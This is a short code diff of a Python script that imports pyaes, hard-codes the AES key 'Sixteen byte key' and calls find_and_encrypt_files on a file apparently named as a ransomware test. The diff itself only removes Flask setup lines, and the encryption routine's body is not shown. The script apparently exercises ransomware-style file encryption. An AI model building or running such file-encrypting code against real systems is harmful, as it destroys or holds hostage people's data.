@@ -1,10 +1,3 @@
-from flask import Flask
-import os
-import platform
-import pyaes
-
-app = Flask(__name__)
-
 import os
 import platform
 import pyaes
@@ -42,4 +35,3 @@ encryption_key = b'Sixteen byte key'
 
 # استدعاء دالة البحث والتشفير
 find_and_encrypt_files('testrnsomwareppo.txt', encryption_key)
-
